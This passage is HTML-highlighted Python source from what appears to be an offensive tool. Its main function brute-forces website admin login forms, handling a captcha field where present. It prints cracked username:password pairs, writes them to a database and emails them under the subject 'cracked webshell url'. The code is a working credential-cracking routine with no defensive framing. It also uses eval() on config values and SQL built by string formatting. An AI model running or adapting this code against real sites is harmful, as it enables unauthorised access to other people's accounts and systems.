    &lt;span class=&quot;n&quot;&gt;figlet2file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cracking admin login url&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cracking admin login url:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;正在使用吃奶的劲爆破登录页面...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;crack_admin_login_url_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xxx_todo_changeme1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xxx_todo_changeme1&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;has_yanzhengma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;values&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;user_form_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;pass_form_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;values&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;user_form_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;pass_form_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;yanzhengma_form_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;yanzhengma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;try_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;USERNAME_PASSWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;(&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; \
            &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# 每100次计算完成任务的平均速度&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;left_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_remain_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;biaoji_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;remain_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
            &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;try_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;remain_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;left_time&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# print(try_time[0])&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# 这里打印出返回的内容利于判断相关信息&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# print(html)&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;try_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;try_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;//&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
                         &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;' &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s  remain time:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s  &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;try_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remain_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;USERNAME_PASSWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;logined_least_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;# 认为登录成功&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;get_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CLIOutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;good_print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;congratulations!!! admin login url cracked succeed!!!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;red&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cracked admin login url:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s username and password:(&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CLIOutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;good_print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;red&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;you spend time:&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;http_domain_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_http_domain_from_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;# 经验证terminate()应该只能结束当前线程,不能达到结束所有线程&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;table_name_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_target_table_name_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http_domain_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;urls_table_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http_domain_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;_&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;_urls&quot;&lt;/span&gt;

            &lt;span class=&quot;c&quot;&gt;# 在爆破成功时将数据库中相应字段标记,并发送邮件&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;# 在非urls表中将cracked_admin_login_urls_info字段添加新的爆破信息&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each_table&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;table_name_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;auto_write_string_to_sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_key_value_from_config_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'config.ini'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'default'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'db_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;each_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s&quot;&gt;&quot;cracked_admin_login_urls_info&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s&quot;&gt;&quot;http_domain&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;http_domain_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;# 将urls表中cracked_admin_login_url_info字段标记为爆破结果信息&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;execute_sql_in_db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;update &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s set cracked_admin_login_url_info='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s' where url='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urls_table_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_key_value_from_config_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'config.ini'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'default'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'db_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;mail_msg_to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cracked webshell url&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

